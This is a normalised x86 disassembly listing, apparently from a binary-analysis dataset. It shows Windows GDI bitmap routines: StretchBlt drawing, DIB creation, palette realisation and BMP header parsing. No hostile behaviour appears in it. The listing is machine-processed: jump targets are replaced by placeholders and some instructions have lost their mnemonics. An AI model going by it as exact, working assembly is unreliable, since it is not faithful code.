mov eax [ eax + 0x28 ]
call sub_427720
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4192f4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_428358
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42893c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4283e7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_427f54
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4278f0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428bac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4283ec
mov eax [ ebp - 0x8 ]
call sub_423d70
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403af8
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_428418
push ebx
mov ebx eax
mov eax ebx
call sub_42870c
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d814
pop ebx
retn
sub_428448
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41b578
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42893c
lea eax [ ebx + 0x2c ]
call sub_40d814
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428bac
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4284bc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425ba0
mov eax ebx
call sub_428a4c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_428848
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4286f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_425acc
push eax
call SetStretchBltMode
mov eax ebx
call sub_42878c
mov dl [ r-xdata ]
call sub_425ba0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4289ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_42878c
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286ff
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42868d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_42878c
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42605c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_42870c
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42894c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_428358
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_425e10
sub_42878c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42894c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427528
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_428418
sub_4287d4
push ebx
mov ebx eax
mov eax ebx
call sub_42893c
mov eax ebx
call sub_42894c
mov edx ebx
mov eax ebx
call sub_428418
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4287f8
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_428878
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_424640
mov eax ebx
call sub_428848
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_42878c
xor edx edx
pop ecx
call sub_425a58
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4288c8
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_428a4c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4278f0
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42894c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41b514
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4289cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4289ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42893c
mov eax ebx
call sub_42894c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_428878
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_427fb8
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4274ac
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_428a4c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_4265a8
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4274ac
push 0x0
call GetDC
call sub_425eb8
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_428b04
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_425d8c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_428358
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42893c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402d00
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428b88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41b4f4
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42923c
pop esi
pop ebx
retn
sub_428bac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428c33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4034cc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_428c93
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_427720
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_42771c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c9a
push rw-data
call LeaveCriticalSection
retn
sub_428cac
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42923c
pop edx
pop edi
pop esi
pop ebx
retn
sub_428cd4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026ec
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4291f1
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4291c4
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402d00
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425da4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41b790
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402d00
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b720
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_426028
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_426048
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41b720
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_425eb8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42913f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_4262f0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026ec
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4290a7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b720
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42907b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4265a8
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40d2b8
call sub_425da4
jmp r-xdata
xor eax eax
push ebp
push sub_42910e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429082
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429146
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40d2b8
call sub_425da4
jmp r-xdata
sub_429082
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_40270c
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_429146
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402d00
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4291db
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4265a8
mov [ ebp - 0x30 ] eax
sub_4291f8
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428bac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42923c
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42893c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41b720
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402d00
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428bac
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_428cd4
call sub_425da4
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4292ac
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42893c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402d00
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_427f54
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_429347
